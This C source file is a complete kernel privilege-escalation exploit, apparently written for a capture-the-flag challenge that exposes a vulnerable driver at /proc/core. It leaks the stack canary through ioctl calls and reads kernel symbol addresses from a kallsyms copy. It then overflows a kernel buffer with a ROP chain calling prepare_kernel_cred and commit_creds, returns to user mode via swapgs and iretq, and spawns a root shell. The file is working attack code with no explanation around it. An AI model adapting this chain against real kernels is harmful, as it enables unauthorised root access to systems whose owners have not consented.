//gcc exp.c -static -masm=intel -o exp
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t prepare_kernel_cred=0;
size_t commit_creds=0;
size_t vmlinux_base;

size_t find_symbols()
{
    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char buf[0x30] = {0};
    while(fgets(buf, 0x30, kallsyms_fd))
    {
        if(commit_creds & prepare_kernel_cred)
            return 0;

        if(strstr(buf, "commit_creds") && !commit_creds)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds addr: %p\n", commit_creds);
            vmlinux_base = commit_creds - 0x9c8e0;
            printf("vmlinux_base addr: %p\n", vmlinux_base);
        }

        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            /* puts(buf); */
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
        }
    }

    if(!(prepare_kernel_cred & commit_creds))
    {
        puts("[*]Error!");
        exit(0);
    }

}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


void p_shell()
{
    if(!getuid())
    {
        system("/bin/sh");
    }
    else
    {
        puts("[*]spawn shell error!");
    }
    exit(0);
}


int main(){

    save_status();
    int fd = open("/proc/core", 2);
    
    //leakcanary
    ioctl(fd, 0x6677889C, 0x40);
    size_t stack[10];
    ioctl(fd, 0x6677889B,&stack);
    printf("canary:%p\n",stack[0]);

    find_symbols();

    size_t pl[0x100];
    int i;
    for(i=0;i<8;i++){
        pl[i]=0x4141414141414141;
    }

    printf("shell fun addr: %p\n",(size_t)p_shell);

    pl[i++]=stack[0];
    pl[i++]=0;
    pl[i++]=0xffffffff81000b2f-0xffffffff81000000+vmlinux_base; //ret add   pop_rdi;ret 
    pl[i++]=0;
    pl[i++]=prepare_kernel_cred; //prepare_kernel_cred
    pl[i++]=0xffffffff810a0f49-0xffffffff81000000+vmlinux_base; //pop rdx;ret
    pl[i++]=commit_creds;
    pl[i++]=0xffffffff8106a6d2-0xffffffff81000000+vmlinux_base; //mov rdi, rax ; jmp rdx
    pl[i++]=0xFFFFFFFF81A012DA-0xffffffff81000000+vmlinux_base; //swapgs;popfq;ret
    pl[i++]=0;
    pl[i++]=0xFFFFFFFF81050AC2-0xffffffff81000000+vmlinux_base; //iretq
    pl[i++]=(size_t)p_shell;  //rip
    pl[i++]=user_cs;        //cs
    pl[i++]=user_rflags;     //Rflags
    pl[i++]=user_sp;     //rsp
    pl[i++]=user_ss;     //ss 

    //write to name
    write(fd, pl, 0x100);
    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | (0x100));

    return 0;
}